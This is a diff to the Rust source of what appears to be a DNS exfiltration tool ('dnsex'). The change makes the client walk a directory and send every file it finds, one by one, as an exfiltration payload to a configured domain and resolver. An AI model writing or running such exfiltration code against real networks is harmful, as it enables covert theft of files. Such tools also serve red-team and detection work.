@@ -4,7 +4,7 @@ use error::DnsexError;
 use server::{Server, ServerConfig};
 use std::path::Path;
 use tokio::fs;
-use tokio::io::{self, AsyncReadExt};
+use walkdir::WalkDir;
 
 mod client;
 mod error;
@@ -86,19 +86,6 @@ async fn main() -> Result<(), DnsexError> {
                 None => return Err(DnsexError::ArgumentError("missing input".to_string())),
             };
 
-            let path = Path::new(&path);
-            let (data, is_directory) = if path.is_dir() {
-                (utils::encode_dir(path).await?, true)
-            } else {
-                (fs::read(&path).await?, false)
-            };
-
-            let payload = ExfilPayload {
-                filename: path.into(),
-                data,
-                is_directory,
-            };
-
             let client_config = ClientConfig {
                 domain,
                 resolver_ip: resolver,
@@ -108,7 +95,28 @@ async fn main() -> Result<(), DnsexError> {
             };
 
             let client = Client::new(client_config);
-            let _ = client.send_payload(payload).await?;
+            let path = Path::new(&path);
+
+            if path.is_dir() {
+                for entry in WalkDir::new(path).into_iter().filter_map(|e| e.ok()).filter(|e| e.file_type().is_file()) {
+                    let entry_path = entry.path().display().to_string();
+                    let bytes = fs::read(&entry_path).await?;
+                    let payload = ExfilPayload {
+                        filename: entry_path,
+                        data: bytes,
+                    };
+
+                    let _ = client.send_payload(payload).await?;
+                }
+            } else {
+                let bytes = fs::read(&path).await?;
+                let payload = ExfilPayload {
+                    filename: path.display().to_string(),
+                    data: bytes,
+                };
+
+                let _ = client.send_payload(payload).await?;
+            };
         }
     };
 
